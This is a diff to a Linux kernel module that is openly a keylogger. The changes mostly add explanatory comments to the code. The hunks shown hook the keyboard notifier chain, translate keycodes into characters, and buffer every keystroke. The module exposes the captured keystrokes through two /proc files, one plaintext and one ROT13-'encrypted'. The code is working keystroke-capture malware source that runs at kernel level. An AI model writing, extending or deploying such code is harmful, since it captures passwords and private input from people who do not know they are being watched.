@@ -1,3 +1,4 @@
+// Include necessary headers for the kernel module, input handling, and memory management
 #include <linux/module.h>
 #include <linux/kernel.h>
 #include <linux/input.h>
@@ -7,8 +8,8 @@
 #include <linux/wait.h>
 #include <linux/sched.h>
 #include <linux/slab.h> // For kzalloc and kfree
-#include <linux/mutex.h> //for mutex 
-
+#include <linux/mutex.h> // for mutex 
+// Define buffer size and proc file names
 #define BUFFER_SIZE 1024
 #define PROC_FILE_NAME "usb_keylogger"
 #define PROC_FILE_ENCRYPTED "usb_keylogger_encrypted"
@@ -27,16 +28,22 @@ static struct notifier_block nb = {
     .notifier_call = keyboard_callback,
 };
 
+// Buffers to store plaintext and encrypted keystrokes
 static char *key_buffer;
 static char *encrypted_buffer;
+// Track positions in the buffers
 static int buffer_pos = 0;
 static int encrypted_pos = 0;
+// Proc file entries for plaintext and encrypted logs
 static struct proc_dir_entry *proc_entry;
 static struct proc_dir_entry *proc_entry_encrypted;
+// Wait queues to handle blocking reads
 static wait_queue_head_t read_queue;
 static wait_queue_head_t encrypted_queue;
+// Flags to indicate if data is available in the buffers
 static int data_available = 0;
 static int encrypted_available = 0;
+// Flag to track if the Shift key is pressed
 static int shift_pressed = 0; // 1 if Shift is pressed, 0 otherwise
 
 // Function to map keycodes to characters
@@ -73,9 +80,9 @@ static char keycode_to_char(int keycode) {
 static void caesar_cipher(char *input, char *output, int len) {
     for (int i = 0; i < len; i++) {
         if (input[i] >= 'a' && input[i] <= 'z') {
-            output[i] = 'a' + (input[i] - 'a' + 13) % 26;
+            output[i] = 'a' + (input[i] - 'a' + 13) % 26; // Rotate lowercase letters
         } else if (input[i] >= 'A' && input[i] <= 'Z') {
-            output[i] = 'A' + (input[i] - 'A' + 13) % 26;
+            output[i] = 'A' + (input[i] - 'A' + 13) % 26; // Rotate uppercase letters
         } else {
             output[i] = input[i]; // Non-alphabetic characters remain unchanged
         }
@@ -88,20 +95,21 @@ static ssize_t proc_read(struct file *file, char __user *user_buffer, size_t cou
     if (*ppos > 0) // Indicates that the read operation is complete
         return 0;
 
-    if (buffer_pos == 0)
+    if (buffer_pos == 0) // Wait for data if buffer is empty
         wait_event_interruptible(read_queue, data_available);
     
     // Acquire the mutex before before shared data
     mutex_lock(&keylogger_mutex);
-
+   
+    // Copy data to user space
     if (copy_to_user(user_buffer, key_buffer, buffer_pos)){
         mutex_unlock(&keylogger_mutex); // Release the mutex on error
         return -EFAULT;
     }
-    *ppos += buffer_pos;
-    int bytes_read = buffer_pos;
-    buffer_pos = 0;
-    data_available = 0;
+    *ppos += buffer_pos; // Update file position
+    int bytes_read = buffer_pos; // Track bytes read
+    buffer_pos = 0; // Reset buffer position
+    data_available = 0; // Reset data availabile flag
   
       // Releasing mutex after shared data
     mutex_unlock(&keylogger_mutex);
@@ -119,16 +127,18 @@ static ssize_t proc_read_encrypted(struct file *file, char __user *user_buffer, 
 
      // Acquire the mutex before before shared data
     mutex_lock(&keylogger_mutex);
-
+  
+    // Copy data to user space
     if (copy_to_user(user_buffer, encrypted_buffer, encrypted_pos)){
         mutex_unlock(&keylogger_mutex); // Release the mutex on error
         return -EFAULT;
     }
 
-    *ppos += encrypted_pos;
-    int bytes_read = encrypted_pos;
-    encrypted_pos = 0;
-    encrypted_available = 0;
+    *ppos += encrypted_pos; // Update file position
+    int bytes_read = encrypted_pos; // Track bytes read
+    encrypted_pos = 0; // Reset buffer position
+    encrypted_available = 0; // Reset data availability flag
+
     
      // Releasing mutex after shared data
     mutex_unlock(&keylogger_mutex);
@@ -150,7 +160,7 @@ static struct proc_ops proc_fops_encrypted = {
 static int keyboard_callback(struct notifier_block *nblock, unsigned long action, void *data) {
     struct keyboard_notifier_param *param = data;
 
-    if (action == KBD_KEYSYM) {
+    if (action == KBD_KEYSYM) { // Check if a key is pressed or released
         if (param->down) {
             char key = '\0';
 
@@ -259,6 +269,6 @@ static void __exit keylogger_exit(void) {
 
     printk(KERN_INFO "Keylogger module unloaded\n");
 }
-
+//Module initialization and exit functions
 module_init(keylogger_init);
 module_exit(keylogger_exit);
